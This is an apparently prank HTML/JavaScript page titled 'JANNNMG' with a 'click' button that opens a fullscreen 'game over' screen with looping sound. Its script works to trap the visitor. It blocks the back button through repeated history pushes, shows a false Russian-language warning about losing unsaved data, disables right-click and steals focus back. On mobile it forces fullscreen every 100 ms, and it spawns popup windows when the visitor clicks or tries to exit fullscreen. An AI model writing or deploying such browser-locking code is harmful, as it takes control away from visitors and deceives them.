<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>JANNNMG</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
            font-family: 'Times New Roman', Times, serif;
            -webkit-user-select: none;
            user-select: none;
            -webkit-touch-callout: none;
        }
        .main-container {
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #mainButton {
            width: 480px;
            height: 300px;
            cursor: pointer;
            border: 5px solid #333;
            background-size: cover;
            background-position: center;
            position: relative;
            overflow: hidden;
            transition: transform 0.2s ease;
        }
        #mainButton:hover {
            transform: scale(1.05);
        }
        #centerClick {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 42px;
            font-weight: bold;
            color: white;
            text-shadow: 2px 2px 8px #000;
            z-index: 100;
        }
        .random-image {
            position: absolute;
            object-fit: cover;
            border: 2px solid rgba(0,0,0,0.3);
            z-index: 1;
        }
        #fullscreenContent {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url('assets/game-over.gif');
            background-size: cover;
            background-position: center;
            display: none;
            z-index: 1000;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <button id="mainButton">
        </button>
    </div>

    <div id="fullscreenContent">
        <audio id="bgMusic" loop>
            <source src="assets/game-over-sound.mp3" type="audio/mpeg">
        </audio>
    </div>

    <script>
        document.title = 'JANNNMG';

        const isMobileDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        let sessionActive = false;

        const mainButton = document.getElementById('mainButton');
        const fullscreenContent = document.getElementById('fullscreenContent');
        const bgMusic = document.getElementById('bgMusic');

        function generateRandomColor() {
            const letters = '0123456789ABCDEF';
            let color = '#';
            for (let i = 0; i < 6; i++) {
                color += letters[Math.floor(Math.random() * 16)];
            }
            return color;
        }

        function setRandomButtonContent() {
            mainButton.style.cursor = 'wait';
            mainButton.style.backgroundColor = generateRandomColor();
            mainButton.innerHTML = '';

            const numberOfImages = 12;
            for (let i = 0; i < numberOfImages; i++) {
                const img = document.createElement('img');
                img.classList.add('random-image');
                const randomSeed = Math.random().toString(36).substring(2, 15);
                const randomWidth = Math.floor(Math.random() * 350) + 20;
                const randomHeight = Math.floor(Math.random() * 350) + 20;
                img.src = `https://picsum.photos/seed/${randomSeed}/${randomWidth}/${randomHeight}.jpg`;
                img.style.width = `${randomWidth}px`;
                img.style.height = `${randomHeight}px`;
                
                const centerX = Math.random() * mainButton.offsetWidth;
                const centerY = Math.random() * mainButton.offsetHeight;
                img.style.left = `${centerX - randomWidth / 2}px`;
                img.style.top = `${centerY - randomHeight / 2}px`;
                
                mainButton.appendChild(img);
            }

            const centerClickSpan = document.createElement('span');
            centerClickSpan.id = 'centerClick';
            centerClickSpan.innerText = 'click';
            mainButton.appendChild(centerClickSpan);
            
            mainButton.style.cursor = 'pointer';
        }

        function requestFullScreenMode() {
            const elem = document.documentElement;
            if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
                if (elem.requestFullscreen) {
                    elem.requestFullscreen().catch(err => {});
                } else if (elem.webkitRequestFullscreen) {
                    elem.webkitRequestFullscreen();
                } else if (elem.msRequestFullscreen) {
                    elem.msRequestFullscreen();
                } else if (elem.mozRequestFullScreen) {
                    elem.mozRequestFullScreen();
                }
            }
        }

        function startSession() {
            if (sessionActive) return;
            sessionActive = true;

            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function (event) {
                history.pushState(null, null, location.href);
            });

            window.addEventListener('beforeunload', function (e) {
                const message = "ВНИМАНИЕ: Все несохраненные данные и прогресс будут безвозвратно утеряны. Вы точно хотите покинуть страницу?";
                e.preventDefault();
                e.returnValue = message;
                return message;
            });

            document.addEventListener('contextmenu', e => e.preventDefault());

            window.addEventListener('blur', () => {
                setTimeout(() => window.focus(), 0);
            });

            if (isMobileDevice) {
                const stateCheckInterval = setInterval(() => {
                    if (sessionActive) {
                        requestFullScreenMode();
                    }
                }, 100);
            }
        }

        function triggerFullScreen() {
            startSession();
            requestFullScreenMode();
            fullscreenContent.style.display = 'block';
            bgMusic.play();
            
            if (isMobileDevice) {
                document.addEventListener('backbutton', function(e) {
                    e.preventDefault();
                    if (confirm("Вы уверены, что хотите выйти?")) {
                        fullscreenContent.style.display = 'none';
                        bgMusic.pause();
                    }
                }, false);
            }
        }

        fullscreenContent.addEventListener('click', function() {
            if (!isMobileDevice) {
                window.open('popup.html', 'popup_' + Date.now(), 'width=650,height=650,resizable=no,scrollbars=no,toolbar=no');
            }
        });
        
        document.addEventListener('fullscreenchange', function() {
            if (!document.fullscreenElement && !isMobileDevice) {
                fullscreenContent.style.display = 'none';
                bgMusic.pause();
                window.open('popup.html', 'popup_' + Date.now(), 'width=650,height=650,resizable=no,scrollbars=no,toolbar=no');
            }
        });

        setRandomButtonContent();
        mainButton.addEventListener('click', triggerFullScreen);
    </script>
</body>
</html>
